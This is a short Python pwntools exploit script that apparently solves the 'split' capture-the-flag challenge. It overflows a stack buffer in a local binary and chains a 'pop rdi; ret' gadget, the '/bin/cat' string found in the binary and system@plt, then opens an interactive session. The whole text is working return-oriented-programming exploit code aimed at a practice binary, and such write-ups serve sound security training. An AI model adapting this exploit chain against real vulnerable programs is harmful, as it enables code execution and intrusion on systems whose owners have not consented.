#!/bin/python3
from pwn import *

p = process('./split')
e = ELF('./split')
r = ROP('./split')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 0x7ffd667cb4e8 - 0x7ffd667cb4c0

payload = b'A'*offset
payload += p64(r.find_gadget(['pop rdi','ret']).address)
payload += p64(next(e.search(b'/bin/cat'))) # you can specify the whole string (b'/bin/cat flag.txt'), but it will read until the string is null-terminated
payload += p64(e.plt['system'])

p.sendline(payload)

p.interactive()